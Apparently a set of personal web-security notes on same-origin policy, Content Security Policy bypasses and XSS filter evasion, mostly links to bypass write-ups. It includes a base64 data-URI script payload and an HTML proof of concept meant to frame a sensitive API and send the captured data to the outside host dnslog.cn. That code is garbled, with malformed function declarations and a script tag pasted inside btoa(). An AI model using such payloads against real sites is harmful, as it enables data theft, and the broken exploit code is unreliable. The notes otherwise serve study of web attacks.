# Striction
## SOP
  __Same-Origin-Policy__



## CSP
   __Content-Security-Policy__, is a mechanism to define which resources can be fetched out or executed by a web page. In other words, it can be understood as a policy that decides which scripts, images, iframes can be called or executed on a particular page from different locations. Content Security Policy is implemented via response headers or meta elements of the HTML page. From there, it’s browser’s call to follow that policy and actively block violations as they are detected.
- [Bypass of CSP](https://csplite.com/csp320/)
- [content-security-policy-csp-bypass-techniques](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
```
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
- [bypassing-csp-with-policy-injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)
- Data protocol allowed: xss by iframe, combining postMessage to steal info
```html
<html>
<body>
<iframe id='attack' src="http://get_method_api_response_contains_sensitive_info/api"></iframe>
<script type="text/javascript">

var frame = document.getElementById("attack");
frame.addEventListener("load", function(){
  setTimeout(sendInfo,600)}
  )
 
function getInfo{
var payload = btoa(<script>                     #data protocol
    window.addEventListener(
     function(event)
       {xhr = new XMLHttpRequest();
        xhr.open("GET","http://dnslog.cn?message="+ event.data);
        xhr.send(null)}
     )
}     

function sendInfo{
 frames[0].postMessage("")
}
</script>
</body>
</html>
```

- script: self : combine the function of file upload
- [ClickJacking](https://resources.infosecinstitute.com/topic/bypassing-same-origin-policy-part-3-clickjacking-cursorjacking-filejacking/)


# Filter
- keyword
- characteristic
  - [iframe srcdoc](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp.md#iframes-in-xss)
  - /xxx/.source
- 
